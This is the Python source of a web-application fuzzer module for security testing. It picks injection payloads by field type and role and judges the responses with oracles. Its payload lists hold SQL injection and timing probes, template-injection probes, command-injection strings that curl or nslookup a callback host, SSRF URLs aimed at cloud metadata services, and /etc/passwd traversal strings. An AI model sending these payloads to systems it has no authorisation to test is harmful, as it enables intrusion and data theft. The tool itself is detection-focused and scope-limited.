"""
Grammar-aware semantic fuzzing.

Two things make this different from spraying a payload list:

1. **One field at a time, everything else valid.** The schema (schema.py)
   tells us the shape of a request. Each mutation changes exactly one field
   and leaves the rest of the request semantically valid, so the app reaches
   the code path we care about instead of bailing out at validation.

2. **Type- and role-aware payload selection.** A field inferred as an email
   gets email-shaped attacks. A field the schema tagged `money` gets negative
   numbers, overflow and precision attacks. A field tagged `target` gets SSRF.
   A random string field gets none of those. This is the "semantic mutation"
   the LLM-fuzzing literature identifies as the real gain over byte-level
   edits -- and it is computable from the schema, so it costs nothing.

The model's role (ai.brief_fuzz) is to propose mutations for the
app-specific fields the schema cannot reason about, offline and once. The
LLM-fuzzing research is explicit that latency and throughput are the
bottleneck for in-loop LLM mutation; keeping the model out of the execution
loop is what lets this run thousands of cases on a Pro plan.

Every case is judged by oracles.py. A payload echoed in a response is not a
finding.
"""

from __future__ import annotations

import json
import re
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from .db import DB
from .diff import Normalised, normalise
from .net import Client, Request
from .oast import OASTClient
from .oracles import (OracleHit, boolean_oracle, differential_oracle,
                      error_oracle, invariant_oracle, oast_oracle,
                      reflection_oracle, timing_oracle)
from .schema import FieldSchema
from .scope import Scope, ScopeViolation

MARKER = "zq7x"          # short, unlikely, survives most encodings


# --------------------------------------------------------------- payloads

@dataclass
class Payload:
    value: Any
    family: str            # sqli | ssti | cmdi | ssrf | path | nosql | xss | logic | type
    intent: str            # human-readable: what this is testing
    oracle: str            # which oracle judges it
    needs_oast: bool = False
    pair: str | None = None   # boolean-pair tag: "true" / "false"
    delay_ms: float = 0.0


def _sqli(sample: str) -> list[Payload]:
    """Boolean pairs and error probes. No union/stacked payloads -- those are
    exploitation, and the oracle only needs to establish the parse."""
    s = sample if sample else "1"
    return [
        Payload(f"{s}'", "sqli", "unbalanced quote -> parse error", "error"),
        Payload(f"{s}\"", "sqli", "unbalanced double quote", "error"),
        Payload(f"{s}')", "sqli", "unbalanced quote+paren", "error"),
        Payload(f"{s}' AND '1'='1", "sqli", "boolean true (string ctx)",
                "boolean", pair="true"),
        Payload(f"{s}' AND '1'='2", "sqli", "boolean false (string ctx)",
                "boolean", pair="false"),
        Payload(f"{s} AND 1=1", "sqli", "boolean true (numeric ctx)",
                "boolean", pair="true"),
        Payload(f"{s} AND 1=2", "sqli", "boolean false (numeric ctx)",
                "boolean", pair="false"),
    ]


def _sqli_timing(sample: str, ms: int = 5000) -> list[Payload]:
    sec = ms // 1000
    s = sample or "1"
    return [
        Payload(f"{s}'; SELECT pg_sleep({sec})--", "sqli",
                f"postgres {sec}s delay", "timing", delay_ms=ms),
        Payload(f"{s}' AND SLEEP({sec})--", "sqli",
                f"mysql {sec}s delay", "timing", delay_ms=ms),
        Payload(f"{s}'; WAITFOR DELAY '0:0:{sec}'--", "sqli",
                f"mssql {sec}s delay", "timing", delay_ms=ms),
    ]


def _nosql(sample: str) -> list[Payload]:
    return [
        Payload({"$ne": None}, "nosql", "operator injection: $ne", "differential"),
        Payload({"$gt": ""}, "nosql", "operator injection: $gt", "differential"),
        Payload({"$regex": ".*"}, "nosql", "operator injection: $regex", "differential"),
        Payload(f"{sample}' && 'a'=='a", "nosql", "js boolean true",
                "boolean", pair="true"),
        Payload(f"{sample}' && 'a'=='b", "nosql", "js boolean false",
                "boolean", pair="false"),
    ]


def _ssti() -> list[Payload]:
    """Arithmetic probes: the oracle checks for the *computed result*, which
    no template that merely echoes input can produce."""
    return [
        Payload("${7*191}", "ssti", "jsp/el arithmetic", "computed"),
        Payload("{{7*191}}", "ssti", "jinja2/twig arithmetic", "computed"),
        Payload("#{7*191}", "ssti", "ruby/thymeleaf arithmetic", "computed"),
        Payload("<%= 7*191 %>", "ssti", "erb arithmetic", "computed"),
        Payload("{7*191}", "ssti", "bare-brace arithmetic", "computed"),
        Payload("${{7*191}}", "ssti", "nested arithmetic", "computed"),
        Payload("@(7*191)", "ssti", "razor arithmetic", "computed"),
    ]


def _cmdi_oast(host: str) -> list[Payload]:
    return [
        Payload(f";curl {host}", "cmdi", "shell separator + callback", "oast", True),
        Payload(f"|curl {host}", "cmdi", "pipe + callback", "oast", True),
        Payload(f"$(curl {host})", "cmdi", "subshell + callback", "oast", True),
        Payload(f"`curl {host}`", "cmdi", "backtick + callback", "oast", True),
        Payload(f"&&nslookup {host}", "cmdi", "chained dns callback", "oast", True),
        Payload(f"\nnslookup {host}\n", "cmdi", "newline injection", "oast", True),
    ]


def _ssrf(host: str, oast_ok: bool) -> list[Payload]:
    out = []
    if oast_ok:
        out += [
            Payload(f"http://{host}/", "ssrf", "plain outbound fetch", "oast", True),
            Payload(f"https://{host}/", "ssrf", "tls outbound fetch", "oast", True),
            Payload(f"//{host}/", "ssrf", "protocol-relative", "oast", True),
            Payload(f"http://127.0.0.1@{host}/", "ssrf",
                    "userinfo confusion", "oast", True),
            Payload(f"http://{host}#@example.com/", "ssrf",
                    "fragment confusion", "oast", True),
        ]
    # metadata probes are judged by the content oracle, not by OAST
    out += [
        Payload("http://169.254.169.254/latest/meta-data/", "ssrf",
                "AWS IMDS", "error"),
        Payload("http://metadata.google.internal/computeMetadata/v1/", "ssrf",
                "GCP metadata", "error"),
        Payload("http://[::ffff:169.254.169.254]/latest/meta-data/", "ssrf",
                "IPv6-mapped IMDS bypass", "error"),
    ]
    return out


def _path_traversal() -> list[Payload]:
    return [
        Payload("../../../../etc/passwd", "path", "unix traversal", "error"),
        Payload("....//....//....//etc/passwd", "path",
                "doubled-dot filter bypass", "error"),
        Payload("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "path",
                "url-encoded traversal", "error"),
        Payload("..%252f..%252f..%252fetc%252fpasswd", "path",
                "double-encoded traversal", "error"),
        Payload("/etc/passwd", "path", "absolute path", "error"),
        Payload("..\\..\\..\\windows\\win.ini", "path", "windows traversal", "error"),
        Payload("file:///etc/passwd", "path", "file scheme", "error"),
    ]


def _xss(marker: str) -> list[Payload]:
    return [
        Payload(f"{marker}<>\"'", "xss", "raw breaking characters", "reflection"),
        Payload(f"\"><x {marker}>", "xss", "attribute break", "reflection"),
        Payload(f"';{marker};//", "xss", "js string break", "reflection"),
        Payload(f"</textarea><x {marker}>", "xss", "textarea break", "reflection"),
        Payload(f"javascript:{marker}", "xss", "url scheme", "reflection"),
    ]


def _money(current: Any) -> list[Payload]:
    """Business-logic mutations on value fields -- often higher paying than
    injection, and almost never found by generic scanners."""
    return [
        Payload(-1, "logic", "negative value", "differential"),
        Payload(0, "logic", "zero value", "differential"),
        Payload(-0.01, "logic", "negative fractional", "differential"),
        Payload(0.001, "logic", "sub-cent precision", "differential"),
        Payload(999999999, "logic", "overflow-scale value", "differential"),
        Payload(2**31, "logic", "int32 boundary", "differential"),
        Payload(2**63, "logic", "int64 boundary", "differential"),
        Payload("1e10", "logic", "scientific notation coercion", "differential"),
        Payload([current, current], "logic", "array instead of scalar "
                "(duplicate-application)", "differential"),
    ]


def _privilege() -> list[Payload]:
    return [
        Payload("admin", "logic", "role escalation via value", "differential"),
        Payload("superuser", "logic", "role escalation via value", "differential"),
        Payload(True, "logic", "boolean privilege flag", "differential"),
        Payload(["admin", "user"], "logic", "array role injection", "differential"),
        Payload("*", "logic", "wildcard scope", "differential"),
    ]


def _state(enum: list | None) -> list[Payload]:
    out = [
        Payload("approved", "logic", "forced state transition", "differential"),
        Payload("completed", "logic", "forced state transition", "differential"),
        Payload("paid", "logic", "forced state transition", "differential"),
    ]
    if enum:
        out.append(Payload(enum[-1], "logic",
                           f"jump to terminal enum value {enum[-1]!r}",
                           "differential"))
    return out


def _type_confusion(current: Any) -> list[Payload]:
    """Type juggling. Cheap, and surprisingly productive on loosely typed
    backends."""
    out = [
        Payload(None, "type", "null instead of value", "differential"),
        Payload([], "type", "empty array", "differential"),
        Payload({}, "type", "empty object", "differential"),
        Payload(True, "type", "boolean coercion", "differential"),
        Payload([current], "type", "scalar wrapped in array", "differential"),
        Payload({"$": current}, "type", "scalar wrapped in object", "differential"),
    ]
    if isinstance(current, str):
        out.append(Payload(0, "type", "number instead of string", "differential"))
        out.append(Payload("", "type", "empty string", "differential"))
        out.append(Payload("A" * 8192, "type", "oversized string", "differential"))
    if isinstance(current, (int, float)):
        out.append(Payload(str(current), "type", "string instead of number",
                           "differential"))
    return out


def _limit() -> list[Payload]:
    return [
        Payload(-1, "logic", "negative pagination", "differential"),
        Payload(0, "logic", "zero limit", "differential"),
        Payload(1000000, "logic", "excessive limit (mass extraction)",
                "differential"),
        Payload("all", "logic", "non-numeric limit", "differential"),
    ]


def _query_field() -> list[Payload]:
    """Fields that name columns or sort keys frequently reach the ORM."""
    return [
        Payload("password", "logic", "request a sensitive column", "differential"),
        Payload("*", "logic", "wildcard field selection", "differential"),
        Payload("id,password,email", "logic", "multi-column selection",
                "differential"),
        Payload("(SELECT 1)", "sqli", "expression in field position", "error"),
    ]


# ----------------------------------------------------- payload selection

def payloads_for(f: FieldSchema, oast_host: str | None,
                 aggressive: bool = False) -> list[Payload]:
    """
    Choose payloads from the field's inferred type, format and role.

    This is the core of grammar-awareness: an email field does not get
    path-traversal payloads, and a money field gets attacks no injection
    list contains.
    """
    out: list[Payload] = []
    sample = f.examples[0] if f.examples else ""
    sample_s = "" if sample is None else str(sample)
    t = f.primary_type
    fmt = f.primary_format
    roles = f.roles
    oast_ok = bool(oast_host)

    # role-driven (highest value, most specific)
    if "money" in roles:
        out += _money(sample)
    if "privilege" in roles:
        out += _privilege()
    if "state" in roles:
        out += _state(f.enum)
    if "limit" in roles:
        out += _limit()
    if "query" in roles:
        out += _query_field()
    if "target" in roles or fmt in ("url", "ipv4"):
        out += _ssrf(oast_host, oast_ok) if oast_ok else _ssrf("", False)
    if "file" in roles or fmt in ("path", "filename"):
        out += _path_traversal()

    # type/format-driven
    if t in ("string", "number") and fmt not in ("uuid", "objectid", "jwt", "b64"):
        out += _sqli(sample_s)
        out += _ssti()
        if oast_ok:
            out += _cmdi_oast(oast_host)
    if t == "string" and fmt not in ("uuid", "objectid", "jwt"):
        out += _xss(MARKER)
    if t in ("string", "object"):
        out += _nosql(sample_s)

    # type confusion applies everywhere
    out += _type_confusion(sample)

    if aggressive:
        out += _sqli_timing(sample_s)

    # enum fields: trying values outside the enum is itself a test
    if f.enum:
        out.append(Payload("__hunt_invalid__", "logic",
                           "value outside observed enum", "differential"))

    # dedupe by (family, repr)
    seen, uniq = set(), []
    for p in out:
        k = (p.family, json.dumps(p.value, default=str), p.pair)
        if k not in seen:
            seen.add(k)
            uniq.append(p)
    return uniq


def inert_control(f: FieldSchema) -> Any:
    """A harmless value of the right type -- the differential oracle's control."""
    t = f.primary_type
    fmt = f.primary_format
    if fmt == "email":
        return "control.zq7x@example.com"
    if fmt == "uuid":
        return "00000000-0000-4000-8000-000000000000"
    if fmt == "objectid":
        return "000000000000000000000000"
    if fmt == "iso_date":
        return "2020-01-01"
    if fmt == "url":
        return "https://example.com/control"
    if t == "number":
        r = f.num_range
        return int(r[0]) if r else 1
    if t == "boolean":
        return False
    if t == "array":
        return []
    if t == "object":
        return {}
    return "controlzq7x"


# ------------------------------------------------------- request building

def apply_mutation(method: str, url: str, headers: dict, body: str | None,
                   f: FieldSchema, value: Any) -> tuple[str, dict, str | None]:
    """Rebuild one request with exactly one field changed."""
    headers = dict(headers)
    parts = urlsplit(url)

    if f.loc == "query":
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        q[f.name] = value if isinstance(value, str) else json.dumps(value)
        url = urlunsplit(parts._replace(query=urlencode(q, doseq=False)))

    elif f.loc == "path":
        segs = (parts.path or "").split("/")
        idx = int(f.name.replace("seg", "")) if f.name.startswith("seg") else -1
        # seg name stores a char offset; find the segment containing it
        acc, target = 0, None
        for i, s in enumerate(segs):
            if acc <= idx <= acc + len(s):
                target = i
                break
            acc += len(s) + 1
        if target is not None:
            segs[target] = str(value)
            url = urlunsplit(parts._replace(path="/".join(segs)))

    elif f.loc == "header":
        headers[f.name] = str(value)

    elif f.loc == "body" and body:
        if body.strip().startswith(("{", "[")):
            try:
                data = json.loads(body)
                _set_path(data, f.name, value)
                body = json.dumps(data)
            except Exception:
                pass
        else:
            q = dict(parse_qsl(body, keep_blank_values=True))
            q[f.name] = value if isinstance(value, str) else json.dumps(value)
            body = urlencode(q)

    headers.pop("Content-Length", None)
    headers.pop("content-length", None)
    return url, headers, body


def _set_path(data: Any, path: str, value: Any) -> None:
    keys = [k for k in re.split(r"\.|\[|\]", path) if k != ""]
    cur = data
    for k in keys[:-1]:
        cur = cur[int(k)] if k.isdigit() else cur[k]
    last = keys[-1]
    if last.isdigit():
        cur[int(last)] = value
    else:
        cur[last] = value


# ------------------------------------------------------------- the runner

@dataclass
class FuzzResult:
    cases: int = 0
    hits: list[dict] = field(default_factory=list)
    skipped_blind: int = 0
    errors: int = 0


def run_fuzz(db: DB, scope: Scope, corpus: str, *,
             oast: OASTClient | None = None,
             aggressive: bool = False,
             max_fields_per_endpoint: int = 25,
             max_cases: int = 0,
             only_route: str | None = None,
             log=print) -> FuzzResult:
    from . import schema as schema_mod

    schemas = schema_mod.infer(db, corpus)
    if only_route:
        schemas = {k: v for k, v in schemas.items() if only_route in k}
    if not schemas:
        log("[fuzz] no schemas inferred -- capture traffic first")
        return FuzzResult()

    oast_host_tpl = None
    if oast and oast.available:
        oast_host_tpl = oast
    else:
        log("[fuzz] no OAST -- blind SSRF/cmdi cases will be SKIPPED, not guessed")

    res = FuzzResult()
    seen_hits: dict[tuple, dict] = {}
    log(f"[fuzz] {len(schemas)} endpoint schemas, "
        f"{sum(len(s.fields) for s in schemas.values())} fields")

    with Client(scope) as client:
        for key, s in schemas.items():
            base_row = db.one("SELECT * FROM requests WHERE id=?", s.request_ids[0])
            if not base_row:
                continue
            base_headers = json.loads(base_row["headers"] or "{}")
            baseline = normalise(base_row["status"], base_row["resp_body"] or "",
                                 base_headers.get("Content-Type", ""))
            fields = sorted(s.fields.values(),
                            key=lambda f: (-len(f.roles), -f.seen))[:max_fields_per_endpoint]

            # An error baseline makes differential comparison noisy, so
            # endpoints captured in a failed state are normally skipped. The
            # exception is an endpoint with a high-value roled field (a URL
            # sink, a file sink): those are worth testing even from a bad
            # baseline, because the error and OAST oracles do not depend on
            # the baseline being healthy.
            if base_row["status"] >= 400:
                if not any(f.roles & {"target", "file", "privilege", "money"}
                           for f in fields):
                    continue
                log(f"[fuzz] {key}  (error baseline {base_row['status']}; "
                    f"error/OAST oracles only)")

            log(f"[fuzz] {key}  ({len(fields)} fields)")

            for f in fields:
                # inert control, once per field
                ctrl_norm = _send(client, db, base_row, f, inert_control(f),
                                  "control", res, log)
                pairs: dict[str, Normalised] = {}
                timing: dict[str, list[float]] = {"control": [], "delay": []}

                for p in payloads_for(f, oast_host_tpl.domain if oast_host_tpl else None,
                                      aggressive):
                    if max_cases and res.cases >= max_cases:
                        log(f"[fuzz] case budget {max_cases} reached")
                        return _finish(res, oast, log)

                    value = p.value
                    token = None
                    if p.needs_oast:
                        if not oast_host_tpl:
                            res.skipped_blind += 1
                            continue
                        token = oast_host_tpl.new_token()
                        value = _inject_token(p.value, oast_host_tpl, token)

                    n = _send(client, db, base_row, f, value, p.family, res, log,
                              repeats=3 if p.oracle == "timing" else 1,
                              timings=timing if p.oracle == "timing" else None)
                    if n is None:
                        continue

                    hits = _judge(p, baseline, n, ctrl_norm, pairs, timing,
                                  oast_host_tpl, token, f)
                    for h in hits:
                        if h.confidence < 0.4:
                            continue
                        # one hit per (endpoint, field, oracle) -- the same
                        # underlying flaw firing on eight payloads is one
                        # finding, not eight
                        dk = (key, f"{f.loc}:{f.name}", h.oracle, p.family)
                        prev = seen_hits.get(dk)
                        if prev and prev["confidence"] >= h.confidence:
                            continue
                        rec = {
                            "endpoint": key, "field": f"{f.loc}:{f.name}",
                            "family": p.family, "intent": p.intent,
                            "oracle": h.oracle, "signal": h.signal,
                            "confidence": h.confidence,
                            "payload": _short(value), "detail": h.detail,
                            "roles": sorted(f.roles),
                        }
                        if prev:
                            res.hits.remove(prev)
                        seen_hits[dk] = rec
                        res.hits.append(rec)
                        log(f"[fuzz] HIT {h.confidence:.2f} {p.family} "
                            f"{f.loc}:{f.name} @ {key}")
                        log(f"         {h.signal}")

    return _finish(res, oast, log)


def _finish(res: FuzzResult, oast, log) -> FuzzResult:
    if oast and oast.available:
        time.sleep(6)   # let late callbacks land
        late = oast.poll()
        if late:
            log(f"[fuzz] {len(late)} late OAST interaction(s) -- "
                f"see `thor fuzz-report`")
            res.hits.append({"endpoint": "-", "field": "-", "family": "oast",
                             "intent": "late out-of-band callback",
                             "oracle": "oast",
                             "signal": f"{len(late)} interaction(s) after run",
                             "confidence": 1.0, "payload": "-",
                             "detail": {"interactions": late[:10]}, "roles": []})
    log(f"[fuzz] {res.cases} cases, {len(res.hits)} hits, "
        f"{res.skipped_blind} blind cases skipped (no OAST), {res.errors} errors")
    return res


def _inject_token(value: Any, oast: OASTClient, token: str) -> Any:
    host = oast.payload(token)
    if isinstance(value, str):
        return re.sub(r"(?<![\w.])" + re.escape(oast.domain), host, value) \
            if oast.domain in value else value.replace("OASTHOST", host)
    return value


def _send(client: Client, db: DB, base_row, f: FieldSchema, value: Any,
          tag: str, res: FuzzResult, log, repeats: int = 1,
          timings: dict | None = None) -> Normalised | None:
    headers = json.loads(base_row["headers"] or "{}")
    url, headers, body = apply_mutation(
        base_row["method"], base_row["url"], headers, base_row["body"], f, value)
    req = Request(base_row["method"], url, headers,
                  body.encode() if body else None,
                  identity=base_row["identity"] or "unknown")
    last = None
    for _ in range(repeats):
        try:
            r = client.send(req)
        except ScopeViolation:
            return None
        except Exception:
            res.errors += 1
            return None
        res.cases += 1
        last = r
        if timings is not None:
            timings["delay" if tag != "control" else "control"].append(r.elapsed_ms)
    if last is None:
        return None
    return normalise(last.status, last.text, last.headers.get("content-type", ""))


def _judge(p: Payload, baseline: Normalised, probe: Normalised,
           control: Normalised | None, pairs: dict, timing: dict,
           oast: OASTClient | None, token: str | None,
           f: FieldSchema | None = None) -> list[OracleHit]:
    roles = f.roles if f else set()

    if p.oracle == "error":
        return error_oracle(baseline, probe)

    if p.oracle == "computed":
        # SSTI: 7*191 == 1337. The literal must NOT appear (that is echo).
        if "1337" in (probe.text or "") and "1337" not in (baseline.text or "") \
                and "7*191" not in (probe.text or ""):
            return [OracleHit("computed",
                              "template expression was evaluated: 7*191 "
                              "rendered as 1337 with the expression absent",
                              0.95, {"family": p.family})]
        return error_oracle(baseline, probe)

    if p.oracle == "boolean" and p.pair:
        pairs[p.pair] = probe
        if "true" in pairs and "false" in pairs:
            hits = boolean_oracle(baseline, pairs["true"], pairs["false"])
            pairs.clear()
            return hits
        return []

    if p.oracle == "timing":
        return timing_oracle(timing.get("control", []), timing.get("delay", []),
                             p.delay_ms)

    if p.oracle == "oast":
        if not (oast and token):
            return []
        return oast_oracle(oast.poll(), token)

    if p.oracle == "reflection":
        return reflection_oracle(probe.text or "", MARKER,
                                 content_type=probe.content_type)

    hits = differential_oracle(baseline, probe, control)
    # business invariants run alongside the differential oracle: a 200 that
    # looks normal but computed a negative total is the case the differential
    # oracle is blind to by design
    hits += invariant_oracle(baseline, probe, roles, p.value)
    return hits


def _short(v: Any, n: int = 120) -> str:
    s = v if isinstance(v, str) else json.dumps(v, default=str)
    return s[:n] + ("…" if len(s) > n else "")
